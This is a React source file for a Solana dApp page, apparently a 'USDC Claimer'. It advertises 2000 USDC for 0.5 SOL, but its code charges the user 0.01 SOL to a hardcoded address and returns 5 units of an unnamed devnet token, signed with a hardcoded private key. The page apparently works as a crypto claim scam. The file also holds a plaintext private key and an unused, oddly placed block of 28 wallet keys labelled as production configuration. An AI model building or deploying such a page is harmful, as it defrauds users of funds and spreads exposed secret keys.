/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2y3ZUYTN1foKymsKcengGv7c3dg5eB67VUJxwiEnEv6Yb6kJ2k3YEnMBqdVTNhDzeCexkxhWtqkpBjgxvAhCFn4H"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3ysPGGksHEFR9GQcoDxk1QH22d8jc2XwiGaG4Fcgpyk5JgZF16hxjtMVJ1NZKxrS2EoKU7Yk8dHHRbSiU94d2nz2",
  "key1": "3HfXmKK9qJbRRXgwEMrSA33FVkUoMbebt7xA5kFAUFiBbDYFF2XQ3BHiWMzj8E8cxp6Eir494sJn4sZmDQJDbNBv",
  "key2": "52XFrZzhwpgijJLpyGdV6zdC71MWyHd3mKMZd886osWLgVA3BqFbrBUkFyawR2DQeekYFU2haUHUKtcS4oxeNfs1",
  "key3": "3CnvYY7DLF5m8EiBbzdVfD8itg9hmKa3zceQkpLzcaekCgKUh7CNkCxJgfn4sXjP68FwccCSKju4vJ5WobkvDv2a",
  "key4": "4WD5V3CN2Ev9FmVWaKvcmVZavriGPpnfExumCLo53YhTWzMbGcKFzeg9gDxf7j9WaxRESmfnWMYsHQ3SrRF4LptS",
  "key5": "5o1TTFVDHj2x7CrXpaWNgCi92UKJHzofHVAFjM5hS6Ra66iZ4tAcoJX5nMg5bopMjyYyRB4pTEPt5ECWbCTtsYac",
  "key6": "34c4pE5WzmEH51GUrEnXeaoc8EpzX28bqNCWYKCBSiRdqBdNhQomWCYUMJ6BAvPU2K9AywEGFYFgdza6actVtRUu",
  "key7": "5QmoBmmCZrzxMGdVano74QBcxwKEQsDURZaH6ktUbXjmxHKLpgc6r2eUjerN2HJ9sSHy6Y9SAnXcGrPFDmgVJYc8",
  "key8": "4ppzboVdBkd1TnNYGN1Lrqm1jaCHA7qUzgM7yF2PokfJUvGYWJaPWokjTmyJqWX3oUaGs5bBVkmUyC8D7nz3xgeL",
  "key9": "4PiZdYHzmHYna7PppnjkkHwBoBkKHhneia5vKdF2pighTqm5sFJWKDg66fKJx7uoKP46StKKorojWiqQhYLR2M8e",
  "key10": "4y36ZykXM7LEtVkRTXzJs4vbLStvzx5i6sRyRNuki7xEqowX1oqTtRKhZ8Q9uFzXtkchS3kSNZczaop3ooVaVPZy",
  "key11": "3kSsSyJk5pQt9b3rRUQBGo8WyqgQgkj2eCd9e5xwdEK3MPH45WQ9R6ZGkAk1ngydHguYmMkYKYp4JrKC4E6h7bZS",
  "key12": "4porr12JGd9vxMM6mgZr88xZEa2BXGk4X652n5K7if11RVHeTQdqYVLdRCPvVUVtU8TChGraZPfktCUBTb3KkTz3",
  "key13": "3Gar3q2zWwfQMM6VN9u1PYpBAifaim6qrCvGpvqjepZYLW3yDQEw4pDxFWVproyLmwhjbtAUt27MQHmh716frjtY",
  "key14": "3fDvotq4YiULMuyccxxZ5Y8nFhvPjXXmk5kVsfnoRfHW5ZCq7EuaZiaZtDWqvMUJa12SdK6qWHsHPhHVEb1fwuZ1",
  "key15": "2jkbmMnEGVkARzXTaeGsc1QuADLaN2rmXiAVdpe3bri52g1VRprNi18DdCPztRCpbTPRD3FZMaonVBYrsCC55qu4",
  "key16": "5STrnLx2rXWaVeFRXoyU4ChHAJ2endyXRndoCZSC7jyjweRX2vzjFELoLMRsStFuhegUDYnqY3zq7Y4AsGVFDgpk",
  "key17": "47NDmmJJPEak4NBhCh2S8oRm2tEzN8ztetohKNdkiYugRd638aQqH6sM7nmcQU5XwYRd89T4o6B9tL3GAq2D2EMg",
  "key18": "5hy1ggXhuwBtzvi7nnvyU12xjhtrhttkRqjFpq4Jxz4AVMSYVX5Da7uREY7qZkHqUvdN3w2t5piNrA2UQPCfm6E1",
  "key19": "2BDPQHyGKStWey3mfKHrhJywzNCWx2s1Gm5Xf7X3NZwm77PccaaaeugrkPziqjwF81ZFciAvWsRu6UJpsqVE4Nyp",
  "key20": "YnsXkVzrMiL6zNEu1CtaNDgYqA3iRz3S97ekaXDWug47uooFbNywBroJK81b2X7JnNGeq6DWPQyw9dKpF3Lj6ur",
  "key21": "3eUSTezNGKfNkjZSzt3zB4ai4NtzxGiHaZfgQPVQuvqTUuyU6KBwVm4ZyqjwRwY8oUm65E5F9Wi3uM5qeEqDFK8o",
  "key22": "3g7dJRPhxzCMzb5iKVXTjG9XUJRvjcjyVjsQBP4ebYFd81zLz5DZbrKqKxvX6uQmEQFwPV7KFmC324G1BsY4qwP9",
  "key23": "2LrXSrBk6wghYxtVWTdFPbJFEibDNvdgLM5zN9TVQf9X2TYmAiipm7aSx1849jkeAzamiXsNohGcXwjuTXF5x5pH",
  "key24": "4CxvfyCDQZFRYaG269XRNHRonuuzSNR8MzXrQsdLrM8AFytDVyEzDv9bP8XJERYVTXtQ4NfTVpZnpH6gdCduLCkQ",
  "key25": "4m1NffmGagyF19aVYDURGV3A3kYgcXNxjxo7C67vazRRbh5h7x8bGpztZoANFkdK1RB11s5CtYSBbjr2CtJX2Fg3",
  "key26": "BNx6pb6pnNPENsdinL4iAvavMjJwPs22Cjbxp5bGM2qhkvuq9FJDX8Vf55Z2ntRSXKYQCR4TiDsv3MitHBfwZME",
  "key27": "5RngL7tHiVUD7QNauKPurn2gm1tWnCVuFvqmMov794EQR5S6ganM5umtqg3Z1T6zkgohxeeCHsxKWS2Qshs7CZy2"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
